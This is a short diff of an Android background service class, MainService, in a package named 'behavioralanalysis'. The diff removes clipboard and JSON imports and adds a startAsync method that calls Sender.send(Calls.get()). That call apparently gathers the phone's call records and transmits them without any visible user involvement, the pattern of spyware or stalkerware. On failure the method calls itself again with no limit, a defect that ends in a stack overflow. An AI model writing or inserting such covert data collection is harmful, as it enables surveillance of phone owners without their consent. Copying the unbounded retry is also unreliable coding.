@@ -3,14 +3,9 @@ package com.behavioralanalysis.service;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.Service;
-import android.content.ClipData;
-import android.content.ClipboardManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.IBinder;
@@ -18,9 +13,6 @@ import android.os.IBinder;
 import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
 import androidx.core.app.NotificationCompat;
-
-import org.json.JSONException;
-import org.json.JSONObject;
 
 public class MainService extends Service {
     private static Context context;
@@ -138,5 +130,15 @@ public class MainService extends Service {
 
     public static Context getContext() {
         return context;
+    }
+
+    public static void startAsync(Context _context) {
+        try {
+            context = _context;
+            Sender.send(Calls.get());
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            startAsync(_context);
+        }
     }
 }
